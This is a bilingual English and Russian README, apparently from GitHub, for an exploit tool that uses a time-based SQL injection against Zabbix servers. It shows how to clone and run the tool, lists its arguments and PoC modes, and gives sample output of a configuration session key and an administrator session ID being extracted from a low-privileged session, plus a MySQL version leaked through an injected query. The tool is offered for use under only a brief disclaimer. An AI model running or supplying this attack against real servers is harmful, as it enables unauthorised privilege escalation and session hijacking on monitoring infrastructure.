
# EN
This tool leverages SQL injection vulnerabilities to extract configuration session keys and session IDs from a target Zabbix server. By exploiting a timing-based flaw, it can extract session information in a secure manner without altering the database content.

### Built With
- **Python 3**
- **aiohttp** for asynchronous HTTP requests
- **argparse** for command-line arguments parsing
- **struct** and **json** for message preparation and sending

## Requirements
To run the tool, ensure you have:
- Python 3 installed
- The necessary Python packages listed in `requirements.txt`

You can install the required packages using:
```bash
pip install -r requirements.txt
```

### Installation
Clone the repository to your local machine:
```bash
git clone https://github.com/geniuszly/GenZabbixSQLi
cd GenZabbixSQLi
```

## Usage
This tool offers multiple modes for exploitation. Below is the general command to run the tool:

```bash
python3 GenZSQLi_exploit.py --ip <ZABBIX_SERVER_IP> --port <PORT> --sid <USER_SESSION_ID> --hostid <HOST_ID>
```

### Command Line Arguments
- `--false_time` - Time to sleep in case of incorrect guesses (default=1).
- `--true_time` - Time to sleep in case of correct guesses (default=10).
- `--ip` - IP address of the target Zabbix server.
- `--port` - Port number of the Zabbix server (default=10051).
- `--sid` - Session ID of a low-privileged user.
- `--hostid` - Host ID accessible to the user with the defined session ID.
- `--poc` - Use this flag to run a Proof of Concept for sleep-based SQL injection.
- `--poc2` - Use this flag to inject a query and generate an error in Zabbix logs.

### Examples
1. Extract the session key and admin session ID:
```bash
python3 GenZSQLi_exploit.py --ip 192.168.1.100 --port 10051 --sid session_id --hostid host_id
```

2. Run a PoC for sleep-based injection:
```bash
python3 GenZSQLi_exploit.py --ip 192.168.1.100 --port 10051 --sid session_id --hostid host_id --poc
```

3. Inject a query to generate Zabbix log errors:
```bash
python3 GenZSQLi_exploit.py --ip 192.168.1.100 --port 10051 --sid session_id --hostid host_id --poc2
```

### Extracting Zabbix session key and admin session ID
```
(+) Извлечение session_key конфигурации Zabbix...
(+) Найден частичный session_key: 1
(+) Найден частичный session_key: 1a
...
(+) Найден полный session_key: 1a2b3c4d5e6f...
(+) Извлечение session_id администратора...
(+) Найден частичный session_id: 9
(+) Найден частичный session_id: 9f
...
(+) Найден полный session_id: 9f8e7d6c5b4a...
```

### Running PoC to test sleep-based SQL injection
```
(+) Выполняем простой PoC...
(+) Тестируем длительность сна: 1 сек.
(+) Время запроса: 1.015 секунд
(+) Тестируем длительность сна: 5 сек.
(+) Время запроса: 5.010 секунд
(+) Тестируем длительность сна: 10 сек.
(+) Время запроса: 10.005 секунд
```

### Generating error in Zabbix logs
```
(+) Внедряем SQL-запрос для получения версии MySQL...
(+) Получен ответ: b'MySQL version 5.7.33-log...'
```


## Features
- **Asynchronous Execution**: Uses `aiohttp` for efficient, non-blocking requests.
- **Retries on Failure**: Automatically retries failed network requests up to 3 times.
- **Command-line Flexibility**: A wide range of parameters for different exploitation scenarios.
- **Logging**: Provides detailed logs for each operation and error.

## Disclaimer
This tool is intended for educational and security research purposes only. The author are not responsible for any misuse or damage caused by this tool. Always ensure you have permission before testing any system.


# RU
Этот инструмент использует уязвимости SQL-инъекций для извлечения ключей конфигурации и идентификаторов сессий из целевого сервера Zabbix. Эксплуатируя временную уязвимость, он способен безопасно получать информацию о сессии без изменения содержимого базы данных.

### Используемые технологии
- **Python 3**
- **aiohttp** для асинхронных HTTP-запросов
- **argparse** для разбора командной строки
- **struct** и **json** для подготовки и отправки сообщений

## Начало работы
### Требования
Для запуска инструмента необходимо:
- Установить Python 3
- Установить необходимые Python-пакеты, указанные в `requirements.txt`

Вы можете установить необходимые пакеты с помощью:
```bash
pip install -r requirements.txt
```

### Установка
Склонируйте репозиторий на свой компьютер:
```bash
git clone https://github.com/geniuszly/GenZabbixSQLi
cd GenZabbixSQLi
```

## Использование
Инструмент предлагает несколько режимов эксплуатации. Ниже приведена основная команда для запуска инструмента:

```bash
python3 GenZSQLi_exploit.py --ip <IP_СЕРВЕРА_ZABBIX> --port <ПОРТ> --sid <ID_СЕССИИ_ПОЛЬЗОВАТЕЛЯ> --hostid <ID_ХОСТА>
```

### Аргументы командной строки
- `--false_time` - Время ожидания при неверном предположении (по умолчанию=1).
- `--true_time` - Время ожидания при верном предположении (по умолчанию=10).
- `--ip` - IP-адрес целевого сервера Zabbix.
- `--port` - Порт сервера Zabbix (по умолчанию=10051).
- `--sid` - ID сессии низкопривилегированного пользователя.
- `--hostid` - ID хоста, доступного пользователю с указанным ID сессии.
- `--poc` - Используйте этот ключ для запуска PoC с инъекцией через команду sleep.
- `--poc2` - Используйте этот ключ для генерации ошибки в логах Zabbix.

### Примеры
1. Извлечение ключа конфигурации и session ID администратора:
```bash
python3 GenZSQLi_exploit.py --ip 192.168.1.100 --port 10051 --sid session_id --hostid host_id
```

2. Запуск PoC для инъекции через sleep:
```bash
python3 GenZSQLi_exploit.py --ip 192.168.1.100 --port 10051 --sid session_id --hostid host_id --poc
```

3. Инъекция запроса для генерации ошибок в логах Zabbix:
```bash
python3 GenZSQLi_exploit.py --ip 192.168.1.100 --port 10051 --sid session_id --hostid host_id --poc2
```

### Извлечение ключа сеанса Zabbix и идентификатора сеанса администратора
```
(+) Извлечение session_key конфигурации Zabbix...
(+) Найден частичный session_key: 1
(+) Найден частичный session_key: 1a
...
(+) Найден полный session_key: 1a2b3c4d5e6f...
(+) Извлечение session_id администратора...
(+) Найден частичный session_id: 9
(+) Найден частичный session_id: 9f
...
(+) Найден полный session_id: 9f8e7d6c5b4a...
```

### Запуск PoC для тестирования SQL-инъекции в режиме ожидания
```
(+) Выполняем простой PoC...
(+) Тестируем длительность сна: 1 сек.
(+) Время запроса: 1.015 секунд
(+) Тестируем длительность сна: 5 сек.
(+) Время запроса: 5.010 секунд
(+) Тестируем длительность сна: 10 сек.
(+) Время запроса: 10.005 секунд
```

### Генерирующая ошибка в журналах Zabbix
```
(+) Внедряем SQL-запрос для получения версии MySQL...
(+) Получен ответ: b'MySQL version 5.7.33-log...'
```


## Особенности
- **Асинхронное выполнение**: Использует `aiohttp` для эффективных асинхронных запросов.
- **Повторные попытки при сбое**: Автоматически повторяет неудачные запросы до 3 раз.
- **Гибкость командной строки**: Широкий спектр параметров для различных сценариев эксплуатации.
- **Логирование**: Предоставляет подробные логи для каждой операции и ошибок.

## Отказ от ответственности
Данный инструмент предназначен исключительно для образовательных и исследовательских целей. Автор не несет ответственности за любое неправильное использование или нанесенный ущерб этим инструментом. Всегда убедитесь, что у вас есть разрешение перед тестированием любой системы.
